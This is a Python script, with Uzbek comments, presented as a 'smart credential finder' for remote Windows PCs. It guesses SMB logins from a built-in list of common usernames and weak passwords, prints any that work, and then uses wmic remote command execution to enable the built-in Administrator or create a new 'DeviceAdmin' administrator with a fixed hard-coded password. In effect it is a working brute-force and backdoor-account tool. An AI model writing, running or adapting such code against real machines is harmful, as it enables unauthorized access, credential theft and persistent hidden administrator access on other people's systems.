"""
Smart Credential Finder — Avtomatik admin hisobini topish/yaratish.
Har bir PC uchun qo'lda parol kiritish shart emas.
"""

import subprocess
import time


COMMON_USERNAMES = [
    "Administrator",
    "Admin",
    "admin",
    "User",
    "user",
]

COMMON_PASSWORDS = [
    "",
    "password",
    "Password1",
    "123456",
    "admin",
    "Admin",
    "Administrator",
    "P@ssw0rd",
    "qwerty",
    "12345678",
]


def try_credentials(ip, username, password):
    """Try to connect to remote PC with given credentials."""
    try:
        result = subprocess.run(
            ["net", "use", f"\\\\{ip}\\IPC$", password, f"/user:{username}"],
            capture_output=True,
            text=True,
            timeout=8,
        )
        if result.returncode == 0:
            subprocess.run(
                ["net", "use", f"\\\\{ip}\\IPC$", "/delete"],
                capture_output=True,
                timeout=5,
            )
            return True
        return False
    except Exception:
        return False


def get_hostname_from_ip(ip):
    """Try to resolve hostname from IP."""
    import socket

    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        return hostname.split(".")[0]
    except Exception:
        return None


def find_working_credentials(ip, custom_usernames=None, custom_passwords=None):
    """
    Try common username/password combinations to find working credentials.
    Returns (username, password) or (None, None) if nothing works.
    """
    usernames = list(COMMON_USERNAMES)
    passwords = list(COMMON_PASSWORDS)

    hostname = get_hostname_from_ip(ip)
    if hostname:
        usernames.insert(0, hostname)
        usernames.append(hostname.upper())
        usernames.append(hostname.lower())

    if custom_usernames:
        usernames = list(custom_usernames) + usernames
    if custom_passwords:
        passwords = list(custom_passwords) + passwords

    print(
        f"  [*] Trying {len(usernames)} usernames x {len(passwords)} passwords = {len(usernames) * len(passwords)} combinations..."
    )

    for username in usernames:
        for password in passwords:
            if try_credentials(ip, username, password):
                print(
                    f"  [+] Found credentials: {username} / {'(empty)' if not password else password}"
                )
                return username, password

    print(f"  [-] No working credentials found for {ip}")
    return None, None


def create_admin_account_remote(
    ip, username, password, new_user="DeviceAdmin", new_password="DeviceMon!tor2026"
):
    """
    Create a new administrator account on remote PC.
    Uses wmic to run net user command remotely.
    """
    try:
        cmd = [
            "wmic",
            f"/node:{ip}",
            f"/user:{username}",
            f"/password:{password}",
            "process",
            "call",
            "create",
            f'cmd.exe /c "net user {new_user} {new_password} /add && net localgroup Administrators {new_user} /add"',
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if "ReturnValue = 0" in result.stdout:
            return True, new_user, new_password
        return False, None, None
    except Exception:
        return False, None, None


def enable_administrator_remote(ip, username, password, new_password=None):
    """
    Enable built-in Administrator account on remote PC.
    """
    if new_password is None:
        new_password = "DeviceMon!tor2026"

    try:
        cmd = [
            "wmic",
            f"/node:{ip}",
            f"/user:{username}",
            f"/password:{password}",
            "process",
            "call",
            "create",
            f'cmd.exe /c "net user Administrator {new_password} /active:yes"',
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)

        if "ReturnValue = 0" in result.stdout:
            return True, "Administrator", new_password
        return False, None, None
    except Exception:
        return False, None, None


def smart_connect(ip, custom_usernames=None, custom_passwords=None):
    """
    Smart connection to remote PC:
    1. Try common credentials
    2. If found — enable Administrator
    3. If can't enable — create new admin account
    4. Return working admin credentials
    """
    print(f"[*] Smart connect to {ip}...")

    # Step 1: Try common credentials
    username, password = find_working_credentials(
        ip, custom_usernames, custom_passwords
    )

    if not username:
        print(f"  [-] Could not find any working credentials for {ip}")
        return False, None, None, "No credentials found"

    # Step 2: Try to enable built-in Administrator
    print(f"  [*] Enabling Administrator account...")
    success, admin_user, admin_pass = enable_administrator_remote(
        ip, username, password
    )

    if success:
        print(f"  [+] Administrator enabled: {admin_user} / {admin_pass}")
        return True, admin_user, admin_pass, "Administrator enabled"

    # Step 3: Create new admin account
    print(f"  [!] Could not enable Administrator. Creating new admin account...")
    success, new_user, new_pass = create_admin_account_remote(ip, username, password)

    if success:
        print(f"  [+] New admin created: {new_user} / {new_pass}")
        return True, new_user, new_pass, "New admin created"

    # Step 4: Use the credentials we found
    print(f"  [*] Using found credentials: {username}")
    return True, username, password, "Using found credentials"


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python smart_connect.py <ip1,ip2,...>")
        sys.exit(1)

    for ip in sys.argv[1].split(","):
        success, user, password, method = smart_connect(ip.strip())
        print(f"\n{'=' * 40}")
        print(f"IP: {ip}")
        print(f"Success: {success}")
        print(f"User: {user}")
        print(f"Password: {password}")
        print(f"Method: {method}")
